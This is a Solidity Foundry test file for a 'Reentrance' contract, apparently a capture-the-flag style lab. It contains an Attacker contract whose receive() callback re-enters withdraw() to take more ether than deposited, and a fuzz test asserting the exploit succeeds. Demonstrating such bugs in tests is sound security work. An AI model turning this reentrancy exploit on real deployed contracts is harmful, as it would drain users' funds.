
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract TestReentrancyReentrance is Test {
    Reentrance public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrance();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        vm.assume(attackVal < address(this).balance / 2);
        
        _contractUnderTest.donate{value: attackVal}(address(_attacker));
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal);
        vm.deal(address(this), attackVal * 2);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    Reentrance public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public attackAmount;
    uint256 public initialVictimBalance;

    constructor(address victimAddress) {
        victim = Reentrance(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        victim.donate{value: msg.value}(address(this));
    }

    function attack(uint256 val) public {
        initialVictimBalance = address(victim).balance;
        
        victim.withdraw(val);
        
        uint256 finalVictimBalance = address(victim).balance;
        uint256 attackerBalance = address(this).balance;
        
        if (attackCallCount == 2 && 
            finalVictimBalance < initialVictimBalance - val &&
            attackerBalance >= val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.withdraw(attackAmount);
        }
    }

    fallback() external payable {}
}
